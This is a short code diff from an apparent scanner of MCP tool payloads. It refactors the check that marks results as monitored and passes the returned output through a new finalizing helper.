                 result.compliance_tags = _merge_tags(
                     result.compliance_tags, _tags_for_finding(f)
                 )
-            if tier2_action == "monitor":
+            if _is_observe_only_posture(tier2_action):
                 result.monitored = True
         result.scan_trace.append(
             {
@@ -513,5 +1021,5 @@ async def scan_mcp_payload(
             setter(new_text)
             result_redacted = True
 
-    out = state_ref[0] if result_redacted else payload
+    out = _finalize_output(state_ref[0] if result_redacted else payload)
     return out, result
